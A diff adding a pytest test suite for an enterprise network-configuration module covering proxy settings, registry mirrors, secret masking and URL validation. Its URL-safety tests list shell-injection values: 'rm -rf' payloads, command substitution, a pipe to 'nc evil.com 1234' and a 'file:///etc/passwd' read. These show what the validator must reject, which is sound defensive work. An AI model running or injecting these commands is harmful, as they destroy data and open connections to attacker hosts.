@@ -1,0 +1,917 @@
+"""Tests for enterprise_config.py — env-var contract for restricted networks."""
+
+from __future__ import annotations
+
+import os
+from unittest import mock
+
+import pytest
+
+
+# ---------------------------------------------------------------------------
+# Helper: scrub the env so each test starts from a known baseline.
+# Any new var we touch must be added here.
+# ---------------------------------------------------------------------------
+
+ENTERPRISE_VARS = (
+    "ENTERPRISE_MODE",
+    "HTTPS_PROXY",
+    "HTTP_PROXY",
+    "NO_PROXY",
+    "https_proxy",
+    "http_proxy",
+    "no_proxy",
+    "REQUESTS_CA_BUNDLE",
+    "NODE_EXTRA_CA_CERTS",
+    "SSL_CERT_FILE",
+    "CURL_CA_BUNDLE",
+    "UV_DEFAULT_INDEX",
+    "UV_HTTP_TIMEOUT",
+    "UV_INDEX_INTERNAL_USERNAME",
+    "UV_INDEX_INTERNAL_PASSWORD",
+    "NPM_REGISTRY",
+    "NPM_TOKEN",
+    "GITHUB_API_BASE",
+    "GITHUB_RELEASE_MIRROR",
+    "CLAUDE_INSTALLER_URL",
+    "HERMES_PIP_URL",
+    "DEEPWIKI_MCP_URL",
+    "EXA_MCP_URL",
+    "npm_config_registry",
+)
+
+
+@pytest.fixture(autouse=True)
+def _clean_env(monkeypatch):
+    """Strip every enterprise env var before each test."""
+    for name in ENTERPRISE_VARS:
+        monkeypatch.delenv(name, raising=False)
+    # Also remove any computed npm_config_// keys lingering from prior tests
+    for key in list(os.environ.keys()):
+        if key.startswith("npm_config_//"):
+            monkeypatch.delenv(key, raising=False)
+
+
+# ---------------------------------------------------------------------------
+# 1. is_enabled / _truthy parsing
+# ---------------------------------------------------------------------------
+
+
+class TestIsEnabled:
+    """ENTERPRISE_MODE is parsed leniently to match ENABLE_HERMES conventions."""
+
+    def test_unset_returns_false(self):
+        from enterprise_config import is_enabled
+
+        assert is_enabled() is False
+
+    @pytest.mark.parametrize(
+        "value", ["true", "TRUE", "True", "1", "yes", "on", " true "]
+    )
+    def test_truthy_values(self, value, monkeypatch):
+        monkeypatch.setenv("ENTERPRISE_MODE", value)
+        from enterprise_config import is_enabled
+
+        assert is_enabled() is True
+
+    @pytest.mark.parametrize("value", ["false", "0", "no", "off", "", "  ", "maybe"])
+    def test_falsy_values(self, value, monkeypatch):
+        monkeypatch.setenv("ENTERPRISE_MODE", value)
+        from enterprise_config import is_enabled
+
+        assert is_enabled() is False
+
+
+# ---------------------------------------------------------------------------
+# 2. proxy_env — pass-through + lowercase mirroring
+# ---------------------------------------------------------------------------
+
+
+class TestProxyEnv:
+    def test_empty_when_unset(self):
+        from enterprise_config import proxy_env
+
+        assert proxy_env() == {}
+
+    def test_passes_through_set_vars(self, monkeypatch):
+        monkeypatch.setenv("HTTPS_PROXY", "http://proxy:3128")
+        monkeypatch.setenv("NO_PROXY", "localhost,.internal")
+        monkeypatch.setenv("REQUESTS_CA_BUNDLE", "/etc/ssl/corp.pem")
+        from enterprise_config import proxy_env
+
+        result = proxy_env()
+        assert result["HTTPS_PROXY"] == "http://proxy:3128"
+        assert result["NO_PROXY"] == "localhost,.internal"
+        assert result["REQUESTS_CA_BUNDLE"] == "/etc/ssl/corp.pem"
+
+    def test_mirrors_to_lowercase_for_curl(self, monkeypatch):
+        monkeypatch.setenv("HTTPS_PROXY", "http://proxy:3128")
+        monkeypatch.setenv("HTTP_PROXY", "http://proxy:3128")
+        from enterprise_config import proxy_env
+
+        result = proxy_env()
+        assert result["https_proxy"] == "http://proxy:3128"
+        assert result["http_proxy"] == "http://proxy:3128"
+
+    def test_explicit_lowercase_not_overwritten(self, monkeypatch):
+        """If operator already set lowercase var explicitly, leave it alone."""
+        monkeypatch.setenv("HTTPS_PROXY", "http://upper:3128")
+        monkeypatch.setenv("https_proxy", "http://lower:3128")
+        from enterprise_config import proxy_env
+
+        result = proxy_env()
+        # Lowercase already in environment — proxy_env shouldn't re-mirror over it
+        assert (
+            "https_proxy" not in result
+            or result.get("https_proxy") == "http://upper:3128"
+        )
+
+    def test_skips_blank_values(self, monkeypatch):
+        monkeypatch.setenv("HTTPS_PROXY", "")
+        from enterprise_config import proxy_env
+
+        assert "HTTPS_PROXY" not in proxy_env()
+
+    def test_ca_bundle_mirrored_to_curl_and_openssl(self, monkeypatch):
+        """REQUESTS_CA_BUNDLE → CURL_CA_BUNDLE + SSL_CERT_FILE so shell scripts pick it up."""
+        monkeypatch.setenv("REQUESTS_CA_BUNDLE", "/etc/ssl/corp.pem")
+        from enterprise_config import proxy_env
+
+        result = proxy_env()
+        assert result["CURL_CA_BUNDLE"] == "/etc/ssl/corp.pem"
+        assert result["SSL_CERT_FILE"] == "/etc/ssl/corp.pem"
+
+    def test_ca_bundle_does_not_overwrite_explicit_curl_var(self, monkeypatch):
+        """Operator-set CURL_CA_BUNDLE wins over derivation from REQUESTS_CA_BUNDLE."""
+        monkeypatch.setenv("REQUESTS_CA_BUNDLE", "/etc/ssl/corp.pem")
+        monkeypatch.setenv("CURL_CA_BUNDLE", "/etc/ssl/explicit.pem")
+        from enterprise_config import proxy_env
+
+        result = proxy_env()
+        assert result["CURL_CA_BUNDLE"] == "/etc/ssl/explicit.pem"
+
+
+# ---------------------------------------------------------------------------
+# 3. uv_env — index URL + auth + scoped indexes
+# ---------------------------------------------------------------------------
+
+
+class TestUvEnv:
+    def test_empty_when_unset(self):
+        from enterprise_config import uv_env
+
+        assert uv_env() == {}
+
+    def test_index_url(self, monkeypatch):
+        monkeypatch.setenv(
+            "UV_DEFAULT_INDEX", "https://jfrog/api/pypi/pypi-virtual/simple/"
+        )
+        from enterprise_config import uv_env
+
+        assert (
+            uv_env()["UV_DEFAULT_INDEX"]
+            == "https://jfrog/api/pypi/pypi-virtual/simple/"
+        )
+
+    def test_timeout(self, monkeypatch):
+        monkeypatch.setenv("UV_HTTP_TIMEOUT", "120")
+        from enterprise_config import uv_env
+
+        assert uv_env()["UV_HTTP_TIMEOUT"] == "120"
+
+    def test_index_auth_pairs_forwarded(self, monkeypatch):
+        monkeypatch.setenv("UV_INDEX_INTERNAL_USERNAME", "svc-bot")
+        monkeypatch.setenv("UV_INDEX_INTERNAL_PASSWORD", "secret")
+        from enterprise_config import uv_env
+
+        result = uv_env()
+        assert result["UV_INDEX_INTERNAL_USERNAME"] == "svc-bot"
+        assert result["UV_INDEX_INTERNAL_PASSWORD"] == "secret"
+
+
+# ---------------------------------------------------------------------------
+# 4. npm_env — npm_config_registry + auth-token key
+# ---------------------------------------------------------------------------
+
+
+class TestNpmEnv:
+    def test_empty_when_unset(self):
+        from enterprise_config import npm_env
+
+        assert npm_env() == {}
+
+    def test_registry_only(self, monkeypatch):
+        monkeypatch.setenv(
+            "NPM_REGISTRY", "https://jfrog.example.com/api/npm/npm-virtual/"
+        )
+        from enterprise_config import npm_env
+
+        result = npm_env()
+        assert (
+            result["npm_config_registry"]
+            == "https://jfrog.example.com/api/npm/npm-virtual/"
+        )
+        # No token configured -> no auth key
+        assert not any(k.startswith("npm_config_//") for k in result)
+
+    def test_registry_with_token(self, monkeypatch):
+        monkeypatch.setenv(
+            "NPM_REGISTRY", "https://jfrog.example.com/api/npm/npm-virtual/"
+        )
+        monkeypatch.setenv("NPM_TOKEN", "tok-abc")
+        from enterprise_config import npm_env
+
+        result = npm_env()
+        assert result["npm_config_//jfrog.example.com/:_authToken"] == "tok-abc"
+
+    def test_token_without_registry_ignored(self, monkeypatch):
+        """Token alone is meaningless — there's no host to attach it to."""
+        monkeypatch.setenv("NPM_TOKEN", "tok-abc")
+        from enterprise_config import npm_env
+
+        assert npm_env() == {}
+
+
+# ---------------------------------------------------------------------------
+# 5. subprocess_env — merge semantics
+# ---------------------------------------------------------------------------
+
+
+class TestSubprocessEnv:
+    def test_includes_base_env(self, monkeypatch):
+        monkeypatch.setenv("FOO", "bar")
+        from enterprise_config import subprocess_env
+
+        env = subprocess_env()
+        assert env["FOO"] == "bar"
+
+    def test_overlays_enterprise_vars(self, monkeypatch):
+        monkeypatch.setenv("HTTPS_PROXY", "http://proxy:3128")
+        monkeypatch.setenv("UV_DEFAULT_INDEX", "https://internal/")
+        monkeypatch.setenv("NPM_REGISTRY", "https://internal-npm/")
+        from enterprise_config import subprocess_env
+
+        env = subprocess_env()
+        assert env["HTTPS_PROXY"] == "http://proxy:3128"
+        assert env["UV_DEFAULT_INDEX"] == "https://internal/"
+        assert env["npm_config_registry"] == "https://internal-npm/"
+
+    def test_empty_base_isolates_additions(self, monkeypatch):
+        monkeypatch.setenv("HTTPS_PROXY", "http://proxy:3128")
+        from enterprise_config import subprocess_env
+
+        env = subprocess_env(base={})
+        # No PATH, no HOME — just the enterprise contribution
+        assert env == {
+            "HTTPS_PROXY": "http://proxy:3128",
+            "https_proxy": "http://proxy:3128",
+        }
+
+
+# ---------------------------------------------------------------------------
+# 6. write_npmrc — file contents + idempotency
+# ---------------------------------------------------------------------------
+
+
+class TestWriteNpmrc:
+    def test_noop_when_registry_unset(self, tmp_path):
+        from enterprise_config import write_npmrc
+
+        assert write_npmrc(tmp_path) is None
+        assert not (tmp_path / ".npmrc").exists()
+
+    def test_writes_registry_line(self, tmp_path, monkeypatch):
+        monkeypatch.setenv(
+            "NPM_REGISTRY", "https://jfrog.example.com/api/npm/npm-virtual/"
+        )
+        from enterprise_config import write_npmrc
+
+        path = write_npmrc(tmp_path)
+        assert path == tmp_path / ".npmrc"
+        text = path.read_text()
+        assert "registry=https://jfrog.example.com/api/npm/npm-virtual/" in text
+
+    def test_writes_auth_token_line(self, tmp_path, monkeypatch):
+        monkeypatch.setenv(
+            "NPM_REGISTRY", "https://jfrog.example.com/api/npm/npm-virtual/"
+        )
+        monkeypatch.setenv("NPM_TOKEN", "tok-abc")
+        from enterprise_config import write_npmrc
+
+        path = write_npmrc(tmp_path)
+        text = path.read_text()
+        assert "//jfrog.example.com/:_authToken=tok-abc" in text
+
+    def test_idempotent(self, tmp_path, monkeypatch):
+        monkeypatch.setenv("NPM_REGISTRY", "https://example.com/npm/")
+        from enterprise_config import write_npmrc
+
+        path = write_npmrc(tmp_path)
+        first_mtime = path.stat().st_mtime_ns
+        # Re-run — should not rewrite (same content)
+        write_npmrc(tmp_path)
+        assert path.stat().st_mtime_ns == first_mtime
+
+    def test_overwrites_on_content_change(self, tmp_path, monkeypatch):
+        from enterprise_config import write_npmrc
+
+        monkeypatch.setenv("NPM_REGISTRY", "https://old.example.com/npm/")
+        path = write_npmrc(tmp_path)
+        assert "old.example.com" in path.read_text()
+        monkeypatch.setenv("NPM_REGISTRY", "https://new.example.com/npm/")
+        write_npmrc(tmp_path)
+        assert "new.example.com" in path.read_text()
+
+
+# ---------------------------------------------------------------------------
+# 7. mirror_github_release / mirror_github_api
+# ---------------------------------------------------------------------------
+
+
+class TestMirrorGithubRelease:
+    def test_passthrough_when_mirror_unset(self):
+        from enterprise_config import mirror_github_release
+
+        url = "https://github.com/cli/cli/releases/download/v2.50.0/gh.tar.gz"
+        assert mirror_github_release(url) == url
+
+    def test_rewrites_when_mirror_set(self, monkeypatch):
+        monkeypatch.setenv(
+            "GITHUB_RELEASE_MIRROR",
+            "https://jfrog.example.com/artifactory/github-mirror",
+        )
+        from enterprise_config import mirror_github_release
+
+        result = mirror_github_release(
+            "https://github.com/cli/cli/releases/download/v2.50.0/gh.tar.gz"
+        )
+        assert result == (
+            "https://jfrog.example.com/artifactory/github-mirror"
+            "/cli/cli/releases/download/v2.50.0/gh.tar.gz"
+        )
+
+    def test_strips_trailing_slash_from_mirror(self, monkeypatch):
+        monkeypatch.setenv("GITHUB_RELEASE_MIRROR", "https://mirror.example.com/")
+        from enterprise_config import mirror_github_release
+
+        result = mirror_github_release(
+            "https://github.com/foo/bar/releases/download/v1/a.zip"
+        )
+        assert result == "https://mirror.example.com/foo/bar/releases/download/v1/a.zip"
+
+    def test_non_github_url_unchanged(self, monkeypatch):
+        monkeypatch.setenv("GITHUB_RELEASE_MIRROR", "https://mirror.example.com")
+        from enterprise_config import mirror_github_release
+
+        result = mirror_github_release("https://example.com/foo")
+        assert result == "https://example.com/foo"
+
+    def test_empty_url_unchanged(self):
+        from enterprise_config import mirror_github_release
+
+        assert mirror_github_release("") == ""
+
+
+class TestMirrorGithubApi:
+    def test_passthrough_when_base_unset(self):
+        from enterprise_config import mirror_github_api
+
+        url = "https://api.github.com/repos/cli/cli/releases/latest"
+        assert mirror_github_api(url) == url
+
+    def test_rewrites_when_base_set(self, monkeypatch):
+        monkeypatch.setenv("GITHUB_API_BASE", "https://ghe.example.com/api/v3")
+        from enterprise_config import mirror_github_api
+
+        result = mirror_github_api(
+            "https://api.github.com/repos/cli/cli/releases/latest"
+        )
+        assert result == "https://ghe.example.com/api/v3/repos/cli/cli/releases/latest"
+
+    def test_non_github_api_unchanged(self, monkeypatch):
+        monkeypatch.setenv("GITHUB_API_BASE", "https://ghe.example.com/api/v3")
+        from enterprise_config import mirror_github_api
+
+        result = mirror_github_api("https://example.com/foo")
+        assert result == "https://example.com/foo"
+
+
+# ---------------------------------------------------------------------------
+# 8. URL overrides (Claude installer, Hermes pip, MCP URLs)
+# ---------------------------------------------------------------------------
+
+
+class TestUrlOverrides:
+    def test_claude_installer_default(self):
+        from enterprise_config import claude_installer_url
+
+        assert claude_installer_url() == "https://claude.ai/install.sh"
+
+    def test_claude_installer_override(self, monkeypatch):
+        monkeypatch.setenv(
+            "CLAUDE_INSTALLER_URL", "https://mirror.example.com/claude-install.sh"
+        )
+        from enterprise_config import claude_installer_url
+
+        assert claude_installer_url() == "https://mirror.example.com/claude-install.sh"
+
+    def test_hermes_pip_default_is_sha_pinned(self):
+        """Default Hermes install spec must include an @<sha> pin (F-06)."""
+        from enterprise_config import DEFAULT_HERMES_PIN_SHA, hermes_pip_url
+
+        spec = hermes_pip_url()
+        # Must reference the NousResearch upstream
+        assert "git+https://github.com/NousResearch/hermes-agent.git" in spec
+        # Must include the pinned SHA — bare HEAD installs are forbidden
+        assert f"@{DEFAULT_HERMES_PIN_SHA}" in spec
+        # SHA shape is a full 40-char hex string
+        assert len(DEFAULT_HERMES_PIN_SHA) == 40
+        assert all(c in "0123456789abcdef" for c in DEFAULT_HERMES_PIN_SHA)
+
+    def test_hermes_pip_override(self, monkeypatch):
+        monkeypatch.setenv("HERMES_PIP_URL", "hermes-agent==1.2.3")
+        from enterprise_config import hermes_pip_url
+
+        assert hermes_pip_url() == "hermes-agent==1.2.3"
+
+    def test_deepwiki_default(self):
+        from enterprise_config import deepwiki_mcp_url
+
+        assert deepwiki_mcp_url() == "https://mcp.deepwiki.com/mcp"
+
+    def test_deepwiki_explicitly_disabled(self, monkeypatch):
+        """Empty string means "drop this MCP server entirely"."""
+        monkeypatch.setenv("DEEPWIKI_MCP_URL", "")
+        from enterprise_config import deepwiki_mcp_url
+
+        assert deepwiki_mcp_url() is None
+
+    def test_deepwiki_override(self, monkeypatch):
+        monkeypatch.setenv(
+            "DEEPWIKI_MCP_URL", "https://internal-mcp.example.com/deepwiki"
+        )
+        from enterprise_config import deepwiki_mcp_url
+
+        assert deepwiki_mcp_url() == "https://internal-mcp.example.com/deepwiki"
+
+    def test_exa_explicitly_disabled(self, monkeypatch):
+        monkeypatch.setenv("EXA_MCP_URL", "")
+        from enterprise_config import exa_mcp_url
+
+        assert exa_mcp_url() is None
+
+
+# ---------------------------------------------------------------------------
+# 9. startup_banner — secret masking and content
+# ---------------------------------------------------------------------------
+
+
+class TestStartupBanner:
+    def test_unset_vars_marked(self):
+        from enterprise_config import startup_banner
+
+        out = startup_banner()
+        assert "ENTERPRISE_MODE=<unset>" in out
+        assert "NPM_REGISTRY=<unset>" in out
+
+    def test_set_vars_shown(self, monkeypatch):
+        monkeypatch.setenv("NPM_REGISTRY", "https://jfrog.example.com/api/npm/")
+        from enterprise_config import startup_banner
+
+        out = startup_banner()
+        assert "NPM_REGISTRY=https://jfrog.example.com/api/npm/" in out
+
+    def test_npm_token_masked(self, monkeypatch):
+        monkeypatch.setenv("NPM_TOKEN", "tok-supersecret")
+        from enterprise_config import startup_banner
+
+        out = startup_banner()
+        assert "tok-supersecret" not in out
+        assert "NPM_TOKEN=***" in out
+
+    def test_url_userinfo_password_masked(self, monkeypatch):
+        """URLs of the form https://user:pass@host should have the password redacted."""
+        monkeypatch.setenv(
+            "UV_DEFAULT_INDEX",
+            "https://svc-bot:topsecret@jfrog.example.com/api/pypi/simple/",
+        )
+        from enterprise_config import startup_banner
+
+        out = startup_banner()
+        assert "topsecret" not in out
+        assert "svc-bot:***@jfrog.example.com" in out
+
+
+# ---------------------------------------------------------------------------
+# 10. missing_when_enabled — warning surface
+# ---------------------------------------------------------------------------
+
+
+class TestMissingWhenEnabled:
+    def test_empty_when_not_enabled(self):
+        from enterprise_config import missing_when_enabled
+
+        assert missing_when_enabled() == []
+
+    def test_lists_recommended_when_enabled(self, monkeypatch):
+        monkeypatch.setenv("ENTERPRISE_MODE", "true")
+        from enterprise_config import missing_when_enabled
+
+        result = missing_when_enabled()
+        assert set(result) == {
+            "UV_DEFAULT_INDEX",
+            "NPM_REGISTRY",
+            "GITHUB_RELEASE_MIRROR",
+        }
+
+    def test_partial_config(self, monkeypatch):
+        monkeypatch.setenv("ENTERPRISE_MODE", "true")
+        monkeypatch.setenv("NPM_REGISTRY", "https://internal/")
+        from enterprise_config import missing_when_enabled
+
+        result = missing_when_enabled()
+        assert "NPM_REGISTRY" not in result
+        assert "UV_DEFAULT_INDEX" in result
+
+
+# ---------------------------------------------------------------------------
+# 11. bootstrap — side effects and idempotency
+# ---------------------------------------------------------------------------
+
+
+class TestBootstrap:
+    def test_writes_npmrc_when_registry_set(self, tmp_path, monkeypatch):
+        monkeypatch.setenv("NPM_REGISTRY", "https://jfrog.example.com/api/npm/")
+        from enterprise_config import bootstrap
+
+        bootstrap(home=tmp_path)
+        assert (tmp_path / ".npmrc").exists()
+
+    def test_pushes_npm_config_env(self, tmp_path, monkeypatch):
+        monkeypatch.setenv("NPM_REGISTRY", "https://internal/")
+        from enterprise_config import bootstrap
+
+        bootstrap(home=tmp_path)
+        assert os.environ.get("npm_config_registry") == "https://internal/"
+
+    def test_setdefault_preserves_operator_value(self, tmp_path, monkeypatch):
+        """An operator who manually set npm_config_registry wins over our derived value."""
+        monkeypatch.setenv("NPM_REGISTRY", "https://internal/")
+        monkeypatch.setenv("npm_config_registry", "https://manual-override/")
+        from enterprise_config import bootstrap
+
+        bootstrap(home=tmp_path)
+        assert os.environ["npm_config_registry"] == "https://manual-override/"
+
+    def test_logs_banner(self, tmp_path, caplog):
+        from enterprise_config import bootstrap
+
+        with caplog.at_level("INFO"):
+            bootstrap(home=tmp_path)
+        assert any(
+            "enterprise_config: effective settings" in r.message for r in caplog.records
+        )
+
+    def test_warns_on_missing_recommended_when_enabled(
+        self, tmp_path, monkeypatch, caplog
+    ):
+        monkeypatch.setenv("ENTERPRISE_MODE", "true")
+        from enterprise_config import bootstrap
+
+        with caplog.at_level("WARNING"):
+            bootstrap(home=tmp_path)
+        assert any(
+            "recommended mirrors are unset" in r.message and "NPM_REGISTRY" in r.message
+            for r in caplog.records
+        )
+
+    def test_no_warning_when_disabled(self, tmp_path, monkeypatch, caplog):
+        from enterprise_config import bootstrap
+
+        with caplog.at_level("WARNING"):
+            bootstrap(home=tmp_path)
+        assert not any(
+            "recommended mirrors are unset" in r.message for r in caplog.records
+        )
+
+
+# ---------------------------------------------------------------------------
+# 12. doctor — reachability with injected http_get
+# ---------------------------------------------------------------------------
+
+
+class TestDoctor:
+    def test_empty_targets_when_nothing_configured(self):
+        from enterprise_config import doctor_targets
+
+        assert doctor_targets() == []
+
+    def test_targets_only_include_configured_vars(self, monkeypatch):
+        monkeypatch.setenv("NPM_REGISTRY", "https://internal-npm/")
+        monkeypatch.setenv("UV_DEFAULT_INDEX", "https://internal-pypi/")
+        from enterprise_config import doctor_targets
+
+        targets = dict(doctor_targets())
+        assert targets == {
+            "NPM_REGISTRY": "https://internal-npm/",
+            "UV_DEFAULT_INDEX": "https://internal-pypi/",
+        }
+
+    def test_doctor_reports_reachable(self, monkeypatch):
+        monkeypatch.setenv("NPM_REGISTRY", "https://internal-npm/")
+        from enterprise_config import doctor
+
+        def fake_get(url):
+            return mock.Mock(status_code=200)
+
+        results = doctor(http_get=fake_get)
+        assert results == [("NPM_REGISTRY", "https://internal-npm/", True, "HTTP 200")]
+
+    def test_doctor_reports_unreachable(self, monkeypatch):
+        monkeypatch.setenv("NPM_REGISTRY", "https://unreachable/")
+        from enterprise_config import doctor
+
+        def fake_get(url):
+            raise ConnectionError("name resolution failed")
+
+        results = doctor(http_get=fake_get)
+        assert results[0][:3] == ("NPM_REGISTRY", "https://unreachable/", False)
+        assert "name resolution failed" in results[0][3]
+
+
+# ---------------------------------------------------------------------------
+# 13. shell_export_lines — debug shell replay
+# ---------------------------------------------------------------------------
+
+
+class TestShellExport:
+    def test_empty_when_nothing_set(self):
+        from enterprise_config import shell_export_lines
+
+        assert shell_export_lines() == []
+
+    def test_renders_export_lines(self, monkeypatch):
+        monkeypatch.setenv("HTTPS_PROXY", "http://proxy:3128")
+        from enterprise_config import shell_export_lines
+
+        lines = shell_export_lines()
+        assert "export HTTPS_PROXY='http://proxy:3128'" in lines
+
+    def test_escapes_single_quotes(self, monkeypatch):
+        monkeypatch.setenv("HTTPS_PROXY", "http://o'malley:3128")
+        from enterprise_config import shell_export_lines
+
+        lines = shell_export_lines()
+        # Standard shell-escape pattern: close, escape, reopen
+        assert any("o'\\''malley" in line for line in lines)
+
+
+# ---------------------------------------------------------------------------
+# 14. URL safety validation (F-02, F-03)
+# ---------------------------------------------------------------------------
+
+
+class TestUrlValidation:
+    """Operator-supplied URLs must reject shell metacharacters before
+    flowing into curl/eval contexts."""
+
+    def test_safe_https_url_passes(self):
+        from enterprise_config import _validate_url
+
+        assert _validate_url(
+            "CLAUDE_INSTALLER_URL", "https://mirror.example.com/claude-install.sh"
+        ) == "https://mirror.example.com/claude-install.sh"
+
+    def test_http_url_passes(self):
+        from enterprise_config import _validate_url
+
+        assert _validate_url(
+            "GITHUB_RELEASE_MIRROR", "http://internal-mirror.local:8080/path"
+        ) == "http://internal-mirror.local:8080/path"
+
+    @pytest.mark.parametrize("dangerous", [
+        "https://evil.com/'; rm -rf ~; echo '",   # single-quote bypass (F-02)
+        "https://evil.com/$(whoami)",              # command substitution
+        "https://evil.com/`whoami`",               # backtick substitution
+        "https://evil.com/path with space",        # whitespace
+        "https://evil.com/path|nc evil.com 1234",  # pipe
+        "https://evil.com/path;ls",                # semicolon
+        "javascript:alert(1)",                     # non-http(s) scheme
+        "file:///etc/passwd",                      # local-file SSRF
+        "https://evil.com/\nGET /etc/passwd",      # newline injection
+    ])
+    def test_unsafe_urls_rejected(self, dangerous):
+        from enterprise_config import _validate_url, UnsafeUrlError
+
+        with pytest.raises(UnsafeUrlError):
+            _validate_url("TEST_VAR", dangerous)
+
+    def test_claude_installer_url_validates(self, monkeypatch):
+        """claude_installer_url() must reject shell-injection attempts."""
+        monkeypatch.setenv("CLAUDE_INSTALLER_URL", "https://evil.com/'; rm -rf ~; echo '")
+        from enterprise_config import claude_installer_url, UnsafeUrlError
+
+        with pytest.raises(UnsafeUrlError):
+            claude_installer_url()
+
+    def test_hermes_pip_url_validates_spec_shape(self, monkeypatch):
+        """hermes_pip_url() must reject shell-injection attempts in pip specs."""
+        monkeypatch.setenv("HERMES_PIP_URL", "hermes-agent==1.0; rm -rf /")
+        from enterprise_config import hermes_pip_url, UnsafeUrlError
+
+        with pytest.raises(UnsafeUrlError):
+            hermes_pip_url()
+
+    def test_hermes_pip_url_accepts_pinned_pypi_spec(self, monkeypatch):
+        monkeypatch.setenv("HERMES_PIP_URL", "hermes-agent==1.2.3")
+        from enterprise_config import hermes_pip_url
+
+        assert hermes_pip_url() == "hermes-agent==1.2.3"
+
+    def test_hermes_pip_url_accepts_sha_pinned_git(self, monkeypatch):
+        monkeypatch.setenv(
+            "HERMES_PIP_URL",
+            "hermes-agent @ git+https://internal/hermes.git@abc123",
+        )
+        from enterprise_config import hermes_pip_url
+
+        assert "@abc123" in hermes_pip_url()
+
+    def test_validate_mirror_env_fails_loud(self, monkeypatch):
+        """bootstrap() should refuse to start if any operator URL is unsafe."""
+        monkeypatch.setenv("GITHUB_API_BASE", "https://evil.com/`whoami`")
+        from enterprise_config import validate_mirror_env, UnsafeUrlError
+
+        with pytest.raises(UnsafeUrlError):
+            validate_mirror_env()
+
+    def test_validate_mirror_env_noop_when_unset(self):
+        """No env vars set = no validation work, no exceptions."""
+        from enterprise_config import validate_mirror_env
+
+        validate_mirror_env()  # must not raise
+
+
+# ---------------------------------------------------------------------------
+# 15. Secret masking for UV_INDEX_* and derived npm auth keys (F-08, F-11)
+# ---------------------------------------------------------------------------
+
+
+class TestSecretMasking:
+    def test_uv_index_password_is_masked(self, monkeypatch):
+        monkeypatch.setenv("UV_INDEX_INTERNAL_PASSWORD", "s3cretp4ss")
+        from enterprise_config import startup_banner
+
+        out = startup_banner()
+        assert "s3cretp4ss" not in out
+        assert "UV_INDEX_INTERNAL_PASSWORD=***" in out
+
+    def test_uv_index_username_is_masked(self, monkeypatch):
+        """Usernames too — they identify the service account, useful to attackers."""
+        monkeypatch.setenv("UV_INDEX_INTERNAL_USERNAME", "svc-coda")
+        from enterprise_config import startup_banner
+
+        out = startup_banner()
+        assert "svc-coda" not in out
+        assert "UV_INDEX_INTERNAL_USERNAME=***" in out
+
+    def test_npm_config_auth_token_masked(self, monkeypatch):
+        monkeypatch.setenv("npm_config_//jfrog.example.com/:_authToken", "tok-xyz")
+        from enterprise_config import startup_banner
+
+        out = startup_banner()
+        assert "tok-xyz" not in out
+
+    def test_is_secret_var_helper(self):
+        from enterprise_config import _is_secret_var
+
+        assert _is_secret_var("NPM_TOKEN")
+        assert _is_secret_var("UV_INDEX_INTERNAL_PASSWORD")
+        assert _is_secret_var("UV_INDEX_ANY_NAME_PASSWORD")
+        assert _is_secret_var("UV_INDEX_X_USERNAME")
+        assert _is_secret_var("npm_config_//host.example.com/:_authToken")
+        assert not _is_secret_var("UV_DEFAULT_INDEX")
+        assert not _is_secret_var("HTTPS_PROXY")
+        assert not _is_secret_var("npm_config_registry")
+
+
+# ---------------------------------------------------------------------------
+# 16. NO_PROXY auto-injection for DATABRICKS_HOST (F-07)
+# ---------------------------------------------------------------------------
+
+
+class TestNoProxyAutoInject:
+    def test_no_inject_when_https_proxy_unset(self, monkeypatch):
+        """If HTTPS_PROXY is unset, NO_PROXY isn't touched."""
+        monkeypatch.setenv("DATABRICKS_HOST", "https://adb-1234.azuredatabricks.net")
+        from enterprise_config import proxy_env
+
+        env = proxy_env()
+        assert "NO_PROXY" not in env  # no proxy → no auto-injection
+
+    def test_inject_when_https_proxy_set(self, monkeypatch):
+        monkeypatch.setenv("HTTPS_PROXY", "http://proxy:3128")
+        monkeypatch.setenv("DATABRICKS_HOST", "https://adb-1234.azuredatabricks.net")
+        from enterprise_config import proxy_env
+
+        env = proxy_env()
+        assert "adb-1234.azuredatabricks.net" in env["NO_PROXY"]
+
+    def test_preserves_existing_no_proxy_entries(self, monkeypatch):
+        monkeypatch.setenv("HTTPS_PROXY", "http://proxy:3128")
+        monkeypatch.setenv("DATABRICKS_HOST", "https://adb-1234.azuredatabricks.net")
+        monkeypatch.setenv("NO_PROXY", "localhost,127.0.0.1")
+        from enterprise_config import proxy_env
+
+        env = proxy_env()
+        assert "localhost" in env["NO_PROXY"]
+        assert "127.0.0.1" in env["NO_PROXY"]
+        assert "adb-1234.azuredatabricks.net" in env["NO_PROXY"]
+
+    def test_skip_when_host_already_in_no_proxy(self, monkeypatch):
+        """If operator already added the host (via wildcard or exact), don't duplicate."""
+        monkeypatch.setenv("HTTPS_PROXY", "http://proxy:3128")
+        monkeypatch.setenv("DATABRICKS_HOST", "https://adb-1234.azuredatabricks.net")
+        monkeypatch.setenv("NO_PROXY", ".azuredatabricks.net")
+        from enterprise_config import proxy_env
+
+        env = proxy_env()
+        # Should still match (host is already covered by wildcard), no duplicate
+        assert env["NO_PROXY"].count("azuredatabricks.net") == 1
+
+    def test_lowercase_no_proxy_mirrored(self, monkeypatch):
+        monkeypatch.setenv("HTTPS_PROXY", "http://proxy:3128")
+        monkeypatch.setenv("DATABRICKS_HOST", "https://adb-1234.azuredatabricks.net")
+        from enterprise_config import proxy_env
+
+        env = proxy_env()
+        assert "adb-1234.azuredatabricks.net" in env["no_proxy"]
+
+
+# ---------------------------------------------------------------------------
+# 17. npm_config_registry / NPM_REGISTRY unification (F-10)
+# ---------------------------------------------------------------------------
+
+
+class TestNpmRegistryResolution:
+    def test_npm_registry_alone(self, monkeypatch):
+        """NPM_REGISTRY alone resolves to that value."""
+        monkeypatch.setenv("NPM_REGISTRY", "https://jfrog.example.com/npm/")
+        from enterprise_config import _effective_npm_registry, npm_env
+
+        assert _effective_npm_registry() == "https://jfrog.example.com/npm/"
+        assert npm_env()["npm_config_registry"] == "https://jfrog.example.com/npm/"
+
+    def test_npm_config_registry_wins_over_NPM_REGISTRY(self, monkeypatch):
+        """If both are set, npm_config_registry (npm-native) wins."""
+        monkeypatch.setenv("NPM_REGISTRY", "https://jfrog.example.com/npm/")
+        monkeypatch.setenv("npm_config_registry", "https://override.example.com/npm/")
+        from enterprise_config import _effective_npm_registry, npm_env
+
+        assert _effective_npm_registry() == "https://override.example.com/npm/"
+        # And npm_env returns the same — no split between env and .npmrc
+        assert npm_env()["npm_config_registry"] == "https://override.example.com/npm/"
+
+    def test_npmrc_uses_same_resolution(self, tmp_path, monkeypatch):
+        """write_npmrc() must use the same effective-registry logic as npm_env()."""
+        monkeypatch.setenv("NPM_REGISTRY", "https://jfrog.example.com/npm/")
